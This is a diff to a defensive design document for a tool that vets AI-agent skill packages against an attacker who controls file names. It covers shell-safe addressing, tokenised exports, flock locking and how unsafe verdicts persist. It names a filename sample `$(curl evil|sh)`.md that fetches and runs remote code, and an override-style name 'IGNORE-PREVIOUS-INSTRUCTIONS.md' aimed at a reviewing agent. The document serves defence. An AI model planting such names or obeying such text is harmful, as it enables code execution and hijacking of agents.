@@ -12,9 +12,13 @@ that are themselves defective:
 | 6 | fixed an arbitrary-code-execution finding by double-quoting the placeholders | double quotes do not stop `$(...)`; the RCE was never fixed, and the verification used the one metacharacter double quotes DO stop |
 | 6 | added a display shape cap, a lock, and nine other fixes | the cap rejected ordinary names while admitting instruction-shaped ones; the lock granted the critical section to both racers; six fixes were incomplete |
 
-Nine of round 6's twelve fixes held. The three that failed share one property:
-each was a **new mechanism invented at fold time** rather than a mechanical
-correction. That is the pattern this document exists to break.
+Of round 6's twelve fixes, **three were defective and six more were incomplete**;
+only three landed clean and complete. (An earlier draft of this paragraph said
+"nine held", which is the count of fixes that were not actively wrong — it read
+as a much better result than the table above it shows, and than `b427bf8`'s own
+body records.) The three DEFECTIVE ones share one property: each was a **new
+mechanism invented at fold time** rather than a mechanical correction. That is
+the pattern this document exists to break.
 
 ## Scope
 
@@ -63,7 +67,7 @@ a candidate uses it.
 ```
 skill_snapshot.py list   --root <ROOT>
 skill_snapshot.py digest --root <ROOT> --select <64-hex>
-skill_snapshot.py export --root <ROOT> --select <64-hex> --dest <DIR>
+skill_snapshot.py export --root <ROOT> --select <64-hex>      # dest is tool-chosen
 skill_snapshot.py record --root <ROOT> --select <64-hex> --verdict <V> \
                          --expect-digest <64-hex> [--reviewer <text>]
 ```
@@ -81,9 +85,19 @@ skill_snapshot.py record --root <ROOT> --select <64-hex> --verdict <V> \
 - Every subcommand **echoes back the display-gated basename it actually
   operated on**, so a path rewrite is visible in the output rather than silent.
 
-The positional `digest <dir>` form stays, for a path the operator typed
-themselves, and its documentation says exactly that: never use it for a name
-that came from the candidate.
+The positional `digest <dir>` form stays in the TOOL, for a path an operator
+typed, but the PROCEDURE stops showing it: no example, no template, no mention
+except a warning. Leaving a working footgun in a document an agent imitates
+guarantees some agent reaches for it with a candidate-derived path — the
+procedure's examples are its real interface.
+
+- **`--select` must resolve through enumeration, never through a path.** `record`
+  and `digest` accept a selector only if it appears in `list --root <ROOT>`'s
+  output for that same root. This is what makes "the candidate is under the
+  root" true by construction; an earlier draft asserted the containment check
+  without designing it, and the obvious implementations are wrong (a `startswith`
+  prefix test accepts `/skills/evil-extra` for root `/skills/evil`, and neither
+  spelling survives a symlinked component).
 
 ### Rejected alternatives
 
@@ -99,11 +113,30 @@ that came from the candidate.
   NAME is indeed strong evidence — but a verdict still has to be recordable
   against them, which needs addressing anyway. Solved by D1 rather than avoided.
 
+### The gap this does NOT close on its own, and how D4 closes it
+
+Addressing fixes the CANDIDATE's name. It does nothing about the names of files
+INSIDE the candidate, which ADV-1 also chooses. A regular file called
+`` `$(curl evil|sh)`.md `` is legal, and the moment the agent runs `cat`,
+`grep -R` or `find -exec` over the tree, those bytes are on a command line
+again. An earlier draft of this document claimed I12 in its strong form and was
+wrong: it moved G3-SHELL one hop, from the directory name to in-tree path
+components, and called it eliminated.
+
+The closure is in D4: `export` **rewrites every path component to a tool-minted
+safe token** (`d0001/f0007.md`) and writes a `MANIFEST.json` mapping token to
+the original raw name bytes as an escaped JSON string. The agent reviews the
+token tree — every path in it is `[a-z0-9./]` — and consults the manifest as
+DATA when it needs to talk about a real name. Nothing in the review touches a
+raw name through a shell.
+
 ### Invariant claimed (attack this)
 
-**I12** — no byte chosen by ADV-1 appears on any command line the vetting
-procedure instructs an agent to run. The only candidate-derived value is a
-64-hex selector minted by the tool.
+**I12** — every path the procedure instructs an agent to put on a command line
+is drawn from a tool-minted alphabet: `[0-9a-f]` for selectors, `[a-z0-9./]` for
+exported paths, plus operator-typed `<ROOT>` and `<DEST>`. No ADV-1 byte appears
+on any of them. Raw names exist only inside `MANIFEST.json`, as escaped JSON
+data that the procedure explicitly forbids passing to a shell.
 
 ---
 
@@ -130,10 +163,25 @@ Replace it with `fcntl.flock()` on a persistent lock file, held across
 load → scan → deliver → store, and taken by **every** writer of the baseline —
 the hook and `record` alike. `status` takes a shared lock for a consistent read.
 
-- flock is kernel-arbitrated, so mutual exclusion is not something this code
-  implements and can get wrong.
-- It is **released automatically when the process dies**, which deletes the
-  entire stale-lock problem class rather than handling it.
+- flock is kernel-arbitrated, so the *arbitration* is not something this code
+  implements. It is **released automatically when the process dies**, which
+  deletes the stale-lock problem class rather than handling it.
+- **But "the kernel solves it" is an overclaim, and the earlier draft made it.**
+  Five things this code must still get right, each of which the current
+  hand-rolled lock gets wrong:
+  1. **Never unlink the lock file on release.** Path-based re-creation defeats
+     fd-held locks — two holders end up with EX locks on different inodes. The
+     current `_release` unlinks; copying that into an flock design reopens
+     dual-holders.
+  2. **One lock path**, used by the hook and by `record`, and not the baseline
+     file itself.
+  3. **Hold scope** must cover the hook's full load→scan→deliver→store AND
+     `record`'s load→mutate→store; `status` takes it shared.
+  4. **flock is advisory and is a no-op on some network mounts.** A network
+     home directory is not exotic. The design cannot detect this reliably, so
+     it is a stated residual, not a solved problem.
+  5. **Serialization does not make a wrong merge right** — it only makes a
+     wrong write atomic. See D5's state machine.
 - Bounded wait: `LOCK_EX | LOCK_NB` polled to a deadline. On timeout the hook
   reports contention and touches nothing; `record` REFUSES rather than
   proceeding unlocked, because a refused record is safe and a lost one is not.
@@ -186,6 +234,15 @@ The opaque id in the advisory widens from 32 bits to the full 64-hex selector,
 which is the same value D1 uses for addressing, so the advisory and the CLI name
 the same thing.
 
+**The advisory must carry a runnable next step, or this trade fails in
+practice.** A user shown "3 skills changed" and three 64-hex strings, with no
+way to turn them into names, learns less than before and ignores the tripwire
+sooner — which is the cry-wolf failure the whole component exists to avoid,
+arrived at from the other direction. So every advisory ends with the literal
+command to run, built only from fixed text and the operator-trusted `<ROOT>`:
+`skill_snapshot.py list --root <ROOT>`. That line contains no ADV-1 byte, so it
+does not reopen I14.
+
 ### Rejected alternatives
 
 - **Any further shape heuristic** (tighter caps, dictionary checks, entropy).
@@ -228,11 +285,41 @@ content in place, before any decision exists.
 
 **Snapshot first, review the snapshot.**
 
-1. `export --root --select --dest <scratch>` copies only regular files into a
-   scratch directory, refusing symlinks, specials and oversize entries (they
-   become anomalies), and prints the digest of what it exported.
+1. `export --root --select` copies only regular files into a scratch directory,
+   refusing symlinks, specials and oversize entries (they become anomalies).
+
+   **Destination is chosen by the tool, not by the caller** (an earlier draft
+   parked this as an open question; it is a decision). `--dest` would otherwise
+   invite `--dest /tmp/$(...)` from a display name, could be pointed inside a
+   watched skills root so the export becomes a new "skill" at the next
+   SessionStart, could union with leftover files from a previous run, or could
+   be a symlink writing through somewhere else. The tool creates
+   `<config>/skill-vetting/exports/<selector>-<nonce>/` at 0700, refuses if it
+   exists, and prints the path. `--dest` exists only as an operator override
+   and refuses any path under a watched root, any existing non-empty directory,
+   and any symlink.
+
+   **Path components are rewritten to tool-minted tokens** (`d0001/f0007.md`),
+   with `MANIFEST.json` mapping each token to the original raw name bytes as an
+   escaped JSON string. This is what actually closes G3-SHELL (see D1): without
+   it, in-tree names reach a shell the moment the agent greps the export.
+
+   **Two digests, both printed, neither ambiguous.** An earlier draft said
+   `export` prints "the digest of what it exported", which is incoherent with
+   how `record` binds: the live encoder covers directories, modes and symlink
+   entries that a regular-files-only copy cannot reproduce, so an export digest
+   could never equal a live digest and every honest `record` would refuse.
+   Instead: `snapshot_digest` is the ordinary live `snapshot_tree` digest of the
+   candidate at export time — this is the value `--expect-digest` binds, and
+   `record` re-observes live and compares against it, so the fail-closed
+   refusal still works. `export_digest` covers only the copied bytes and exists
+   so the reviewer can prove the export was not tampered with afterwards.
 2. Every later step — the full read, the §2 sweep, the checklist — operates on
-   the EXPORT, which is inert, local, and cannot change under the reviewer.
+   the EXPORT, which is inert, local, token-named, and cannot change under the
+   reviewer. **The export is a review artifact, not a runtime replica**: a
+   candidate whose behaviour depends on what the export excludes (symlinks,
+   special files, anything oversize) is BLOCK or SUSPECT on those grounds, not
+   "export incomplete, skip the check".
 3. The verdict binds to the export's digest. `--expect-digest` then means what
    §3 has always claimed it means, because the reviewed bytes and the digested
    bytes are the same bytes by construction.
@@ -282,16 +369,46 @@ out of the candidate tree.
 
 ### Decision
 
-- Split the lifecycle: `vetted` means *reviewed AND cleared*. An adverse verdict
-  gets its own terminal state, `judged-unsafe`, which **always advises while the
-  skill is present** and is reported by `status` with a non-zero exit.
-- Make the adverse record **sticky**: a content change moves the entry back to
-  `seen` for delta purposes but retains `prior_adverse: true`, so a later
-  advisory says "this skill was previously judged unsafe and has since changed"
-  rather than laundering the history.
-- `record` states its write target in its own output and requires `--root`, so
-  the destination is explicit rather than inferred from the environment.
-- `record` refuses when the selected candidate is not under `--root`.
+A state machine, written out, because the round-6 failures were all
+under-specified transitions.
+
+- **`vetted` means reviewed AND cleared.** An adverse verdict gets its own
+  terminal state, `judged-unsafe`.
+- **`judged-unsafe` is an ANOMALY-CLASS line, not a consumable delta.** It
+  recurs every session while the skill is present, exactly like an unreadable
+  file does, and is never "delivered and done". An earlier draft made only the
+  initial judgement permanently loud and left the post-change state undefined —
+  which meant flipping one payload byte moved the entry to `seen`, produced one
+  transient "previously judged unsafe and has since changed" line, and then went
+  quiet forever. That is the same defect D5 exists to fix, reintroduced through
+  the change path.
+- **Adverse stickiness keys on CONTENT, not on the name.** The baseline is keyed
+  by `name_key = sha256(name)`, and ADV-1 chooses names — so renaming
+  `trojan` to `trojan-helper` retires the old key (one removal line, then
+  consumed) and creates a fresh entry with no history. Identity for adverse
+  purposes is therefore a set of `prior_adverse_digests` carried at scope level:
+  any candidate whose tree digest matches one of them is `judged-unsafe` on
+  sight, whatever it is called. A renamed trojan stays loud; a genuinely new
+  skill is unaffected.
+- **Adverse lines get a RESERVED slot, and collapse.** Making a subset of lines
+  permanently loud, inside a display cap, is precisely the shape of the round-6
+  budget poisoner: N permanent lines evict the one-shot delta for the new
+  payload while the baseline still advances for what was shown. So: transient
+  deltas keep first claim on the slots (I10 is unchanged), and ALL
+  `judged-unsafe` entries collapse into ONE line carrying a count —
+  "N installed skill(s) were judged unsafe and are still present; run
+  `skill_snapshot.py status --root <ROOT>`" — which cannot grow with N.
+- **There is a clearing path.** A mistaken BLOCK on the operator's own skill
+  must not be a permanent nag curable only by deletion. Recording a later
+  non-adverse verdict for the same content digest removes it from
+  `prior_adverse_digests` — an explicit operator act, with the earlier adverse
+  verdict retained in `provenance` so the history is not erased, only superseded.
+- **`record` states its write target** in its own output and requires `--root`,
+  so the destination is explicit rather than inferred from the environment. (The
+  maintainer wrote a stray entry into the real `~/.claude` during round-6
+  verification precisely because it was inferred.)
+- **`status` keeps a non-zero exit for adverse**, and gains `--porcelain` for
+  callers that read any non-zero as tool failure.
 
 ### Rejected alternatives
 
@@ -320,21 +437,47 @@ so, and no action available to ADV-1 removes that statement.
 - **One round-7 verification lens did not complete** (an API safety filter
   terminated it mid-run), so that finding carries two votes rather than three.
 
-## Open questions for the round-8 gate
+## Answered by the round-8 first pass (grok-4.5 high), now decisions above
 
-1. Is I12 actually achieved, or does some step still put an attacker-chosen byte
-   on a command line? In particular: how does the agent read the export, and can
-   `--dest` itself be attacker-influenced?
-2. Does `export` introduce a new class of defect? It writes files. Where, with
-   what permissions, and what happens when the destination exists, is a symlink,
-   or fills the disk?
-3. Is the advisory still useful when it carries no names? A user who sees "3
-   skills changed" plus three 64-hex selectors has to run a second command to
-   learn anything. Is that trade correct, or does it push people toward ignoring
-   the tripwire — the cry-wolf failure the whole design exists to avoid?
-4. Does `judged-unsafe` create a new permanent-noise channel that ADV-1 can
-   induce, in the way the round-6 budget poisoner did?
-5. Does flock behave as assumed on every platform the pack claims to support,
-   and what happens on a filesystem where it is a no-op (some network mounts)?
-6. Is "export, then review the export" sound when the thing being vetted is a
-   git checkout whose behaviour depends on files the export excludes?
+The first three of this document's original open questions were answered by the
+reviewer rather than parked, and the answers are folded in above:
+
+1. *Is I12 actually achieved?* **No, as originally stated.** Addressing fixed
+   the candidate's name and left in-tree names to reach a shell at the first
+   `grep -R`. Closed by export path-tokenisation; I12 is restated to claim only
+   what it establishes.
+2. *Does `export` introduce a new class of defect?* **Yes, and `--dest` was the
+   worst of it** — attacker bytes via a display name, an export landing inside a
+   watched root and self-triggering next session, union with leftover files, a
+   symlinked destination, world-readable exports of trees the user kept at 0700.
+   The destination is now tool-chosen, 0700, refuse-if-exists, refuse-under-root.
+3. *Is the advisory still useful with no names?* **Only with a runnable next
+   step.** Folded into D3.
+
+Two further defects the same pass found, also folded in: the export/live digest
+relationship was incoherent (an export of regular files can never equal a live
+digest that binds directories, modes and symlink entries, so every honest
+`record` would have refused), and `judged-unsafe` as first drafted was both
+rename-erasable and a fresh budget poisoner.
+
+## Open questions that remain
+
+1. Does flock behave as assumed on every platform the pack claims to support,
+   and what is the honest posture on a mount where it is a silent no-op? D2
+   states this as a residual rather than solving it — is that acceptable, or
+   does it need a detection attempt?
+2. Is "export, then review the export" sound when the candidate is a git
+   checkout whose behaviour depends on what the export excludes? D4 answers
+   "that dependence is itself BLOCK/SUSPECT", which is fail-closed but may be a
+   false-BLOCK factory for ordinary skills that ship a symlink.
+3. Does path-tokenisation cost the reviewer something real? A trojan's payload
+   is sometimes *in* the filename, and a reviewer reading `d0001/f0007.md` has to
+   go to `MANIFEST.json` to see that the real name was
+   `IGNORE-PREVIOUS-INSTRUCTIONS.md`. The manifest keeps the information, but
+   the reviewer's attention is now one hop away from it.
+4. `prior_adverse_digests` grows without bound at scope level. What retires an
+   entry other than an explicit clearing verdict, and what stops it becoming its
+   own denial-of-service against the baseline size cap?
+5. Is the collapsed one-line `judged-unsafe` summary strong enough? It cannot be
+   evicted by count, but it also no longer names which skill — the same trade as
+   D3, applied to the most serious statement the tool makes.
